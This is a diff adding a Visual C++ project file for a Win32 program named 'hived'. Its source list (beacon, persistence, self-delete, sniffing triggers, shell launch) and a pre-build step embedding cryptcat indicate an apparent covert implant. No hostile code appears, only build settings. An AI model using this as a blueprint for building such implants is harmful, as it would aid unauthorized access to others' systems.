@@ -1,0 +1,185 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <Keyword>Win32Proj</Keyword>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <CharacterSet>NotSet</CharacterSet>
+    <PlatformToolset>v90</PlatformToolset>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <CharacterSet>NotSet</CharacterSet>
+    <PlatformToolset>v90</PlatformToolset>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <LinkIncremental>true</LinkIncremental>
+    <CustomBuildBeforeTargets>PreBuildEvent</CustomBuildBeforeTargets>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <LinkIncremental>true</LinkIncremental>
+    <GenerateManifest>false</GenerateManifest>
+    <TargetName>hived-windows-i386-unpatched</TargetName>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;_CRT_SECURE_NO_WARNINGS;CINTERFACE;_LITTLE_ENDIAN;%(PreprocessorDefinitions);IANDEBUG</PreprocessorDefinitions>
+      <RuntimeLibrary>MultiThreadedDebugDLL</RuntimeLibrary>
+      <WarningLevel>Level3</WarningLevel>
+      <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
+      <Optimization>Disabled</Optimization>
+      <CallingConvention>Cdecl</CallingConvention>
+      <AdditionalIncludeDirectories>..\libs\polarssl-0.14.0\include;..\libs;%(AdditionalIncludeDirectories);shlwapi.lib</AdditionalIncludeDirectories>
+      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
+    </ClCompile>
+    <Link>
+      <TargetMachine>MachineX86</TargetMachine>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <SubSystem>Console</SubSystem>
+      <AdditionalDependencies>C:\WinDDK\6001.18001\lib\w2k\i386\msvcrt_win2000.obj;ws2_32.lib;shlwapi.lib;Iphlpapi.lib;Pdh.lib;mstask.lib;ole32.lib;polarssl.lib;libbz2.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalLibraryDirectories>bzip;..\libs\polarssl-0.14.0\library;C:\WinDDK\6001.18001\lib\crt\i386</AdditionalLibraryDirectories>
+      <GenerateMapFile>true</GenerateMapFile>
+      <IgnoreAllDefaultLibraries>
+      </IgnoreAllDefaultLibraries>
+      <IgnoreSpecificDefaultLibraries>libcmt.lib</IgnoreSpecificDefaultLibraries>
+      <ShowProgress>NotSet</ShowProgress>
+    </Link>
+    <CustomBuildStep>
+      <Command>python mod_gen_string_header.py server_strings.txt SERVER_STRINGS</Command>
+      <Outputs>proj_strings.h proj_strings_main.h init_strings.c</Outputs>
+    </CustomBuildStep>
+    <PreBuildEvent>
+      <Command>Release\bin2carray.exe cryptcat\cryptcat.exe prebuildutilinclude.h</Command>
+    </PreBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <PreprocessorDefinitions>WIN32;_NDEBUG;_CONSOLE;_CRT_SECURE_NO_WARNINGS;CINTERFACE;_LITTLE_ENDIAN;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <RuntimeLibrary>MultiThreadedDLL</RuntimeLibrary>
+      <WarningLevel>Level3</WarningLevel>
+      <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
+      <AdditionalIncludeDirectories>..\libs\polarssl-0.14.0\include;..\libs;%(AdditionalIncludeDirectories);shlwapi.lib</AdditionalIncludeDirectories>
+      <Optimization>MinSpace</Optimization>
+    </ClCompile>
+    <Link>
+      <TargetMachine>MachineX86</TargetMachine>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <AdditionalLibraryDirectories>bzip;..\libs\polarssl-0.14.0\library;C:\WinDDK\6001.18001\lib\crt\i386</AdditionalLibraryDirectories>
+      <AdditionalDependencies>C:\WinDDK\6001.18001\lib\w2k\i386\msvcrt_win2000.obj;ws2_32.lib;shlwapi.lib;Iphlpapi.lib;Pdh.lib;mstask.lib;ole32.lib;polarssl.lib;libbz2.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <IgnoreAllDefaultLibraries>
+      </IgnoreAllDefaultLibraries>
+      <ShowProgress>LinkVerbose</ShowProgress>
+      <IgnoreSpecificDefaultLibraries>libcmt.lib</IgnoreSpecificDefaultLibraries>
+    </Link>
+    <PreBuildEvent>
+      <Command>Release\bin2carray.exe cryptcat\cryptcat.exe prebuildutilinclude.h</Command>
+    </PreBuildEvent>
+    <CustomBuildStep>
+      <Command>
+      </Command>
+    </CustomBuildStep>
+    <CustomBuildStep>
+      <Outputs>
+      </Outputs>
+    </CustomBuildStep>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="..\libs\crypto.c" />
+    <ClCompile Include="beacon.c" />
+    <ClCompile Include="client_session.c" />
+    <ClCompile Include="compression.c" />
+    <ClCompile Include="daemonize.c" />
+    <ClCompile Include="getopt.cpp" />
+    <ClCompile Include="get_data.c" />
+    <ClCompile Include="ifconfig.c" />
+    <ClCompile Include="init_crypto_strings.c" />
+    <ClCompile Include="init_strings.c" />
+    <ClCompile Include="main.c" />
+    <ClCompile Include="netstat_an.c" />
+    <ClCompile Include="netstat_rn.c" />
+    <ClCompile Include="persistence.c" />
+    <ClCompile Include="process_list.c" />
+    <ClCompile Include="run_command.c" />
+    <ClCompile Include="self_delete.c" />
+    <ClCompile Include="string_utils.c" />
+    <ClCompile Include="survey_mac.c" />
+    <ClCompile Include="survey_uptime.c" />
+    <ClCompile Include="threads.c" />
+    <ClCompile Include="timeout.c" />
+    <ClCompile Include="tiny_crc16.c" />
+    <ClCompile Include="trigger_callback_session.c" />
+    <ClCompile Include="trigger_listen.c" />
+    <ClCompile Include="trigger_b64.c" />
+    <ClCompile Include="trigger_payload.c" />
+    <ClCompile Include="trigger_sniff.c" />
+    <ClCompile Include="launchshell.c" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="..\libs\crypto.h" />
+    <ClInclude Include="beacon.h" />
+    <ClInclude Include="client_session.h" />
+    <ClInclude Include="common_utils.h" />
+    <ClInclude Include="compat.h" />
+    <ClInclude Include="compression.h" />
+    <ClInclude Include="crypto_proj_strings.h" />
+    <ClInclude Include="crypto_strings_main.h" />
+    <ClInclude Include="daemonize.h" />
+    <ClInclude Include="Debug.h" />
+    <ClInclude Include="getopt.h" />
+    <ClInclude Include="get_data.h" />
+    <ClInclude Include="ifconfig.h" />
+    <ClInclude Include="netstat_an.h" />
+    <ClInclude Include="netstat_rn.h" />
+    <ClInclude Include="persistence.h" />
+    <ClInclude Include="process_list.h" />
+    <ClInclude Include="proj_strings.h" />
+    <ClInclude Include="proj_strings_main.h" />
+    <ClInclude Include="run_command.h" />
+    <ClInclude Include="self_delete.h" />
+    <ClInclude Include="stdint.h" />
+    <ClInclude Include="string_utils.h" />
+    <ClInclude Include="survey_mac.h" />
+    <ClInclude Include="survey_uptime.h" />
+    <ClInclude Include="threads.h" />
+    <ClInclude Include="timeout.h" />
+    <ClInclude Include="tiny_crc16.h" />
+    <ClInclude Include="trigger_callback_session.h" />
+    <ClInclude Include="trigger_listen.h" />
+    <ClInclude Include="trigger_b64.h" />
+    <ClInclude Include="trigger_debug.h" />
+    <ClInclude Include="trigger_payload.h" />
+    <ClInclude Include="trigger_sniff.h" />
+    <ClInclude Include="unpifi.h" />
+    <ClInclude Include="launchshell.h" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
